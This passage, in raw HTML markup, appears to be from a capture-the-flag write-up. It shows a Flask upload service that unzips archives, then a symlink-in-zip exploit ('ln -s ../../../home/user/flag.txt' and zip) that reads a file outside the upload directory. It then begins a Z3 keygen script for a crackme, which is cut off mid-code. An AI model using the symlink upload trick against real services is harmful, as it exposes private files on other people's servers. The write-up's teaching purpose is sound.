style=\"color:#22863A;--shiki-dark:#ECC48D\">unzip\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">, filename, \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">-d\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">, \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">upload_dir\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">files/\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">upload_uuid\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">]\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">    flash\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'Your file is at &#x3C;a href=\"/files/\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">upload_uuid\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\">\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">upload_uuid\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">&#x3C;/a>!'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">success\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">    )\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    logging\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">info\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"User uploaded file \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">upload_uuid\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">.\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> redirect\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">@\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\">app\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#C5E478\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\">route\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/files/&#x3C;path:path>\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> files\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">path\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    try\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> send_from_directory\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">upload_dir \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">files\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> path\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    except\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> PermissionError\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">        abort\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">404\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">@\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\">app\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#C5E478\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic\">errorhandler\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">404\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> page_not_found\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">error\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> render_template\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">404.html\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Ignoring all the basic web application setup, what we really care about is WHAT WE CAN PREDICTABLY CONTROL. So we should only analyze the \u003Ccode>subprocess.call()\u003C/code> function since that is the only “dangerous” function we can mess with.\u003C/p>\n\u003Cp>A tip is that whenever we deal with compressed files, such as \u003Ccode>zip\u003C/code> or \u003Ccode>tar\u003C/code> the problem of \u003Ccode>symbolic links\u003C/code> come up. Symbolic links are basically files that “point” to other files. Vulnerable web applications such as this do not verify if the decompressed file is a symlink. So with that fact, we can build the process.\u003C/p>\n\u003Col>\n\u003Cli>Create a symlink to flag\u003C/li>\n\u003Cli>Upload the symlink\u003C/li>\n\u003Cli>Profit $$$$$$\u003C/li>\n\u003C/ol>\n\u003Cp>So lets symlink and zip it. (The flag stuff was based on analysis on the Dockerfile)\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">ln\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -s\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> ../../../home/user/flag.txt\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> flag\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">zip\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#82AAFF\"> -r\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> flag.zip\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> flag\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We then send it, download it, and… we profit!\u003C/p>\n\u003Cblockquote>\n\u003Cp>CSCTF{5yml1nk5_4r3_w31rd}\u003C/p>\n\u003C/blockquote>\n\u003Ch2 id=\"reverse-engineering\">Reverse Engineering\u003C/h2>\n\u003Ch3 id=\"key\">Key\u003C/h3>\n\u003Cblockquote>\n\u003Cp>GDB is cool! Ghidra or IDA is helpful\u003C/p>\n\u003C/blockquote>\n\u003Cp>This is a basic keygen + password checking crackme. What we do is just find the algorithm in a disassembler like \u003Ccode>Ghidra\u003C/code> and put the algorithm in a Z3 script.\u003C/p>\n\u003Cp>Solution:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> z3 \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Initialize a solver\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">solver \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> Solver\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Define the 32-byte key as a list of BitVecs\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> [\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">BitVec\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'key_\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">i\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 8\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> i \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> range\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Define the values of v6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">v6 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\"> [\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">    67\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 164\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 65\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 174\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 66\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 252\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 115\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 176\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 111\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 114\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 94\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 168\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 101\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 242\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 81\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 206\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">    32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 188\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 96\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 164\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 109\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 70\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 33\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 90\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 44\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 82\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 45\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 94\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 45\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 196\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Define the constraints based on the program logic\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">for\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> i \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">in\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> range\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">32\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    transformed_value \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (i \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">%\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 2\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> +\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (i \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">^\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> key\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">i\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">]\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    solver\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">add\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">transformed_value \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">==\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> v6\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">i\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">])\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Check if the solution exists\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> solver\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">check\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ==\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> sat\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    model \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> solver\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">model\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    result_key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> ''\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">join\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">[\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">chr\u003C/span>\u003Cspan 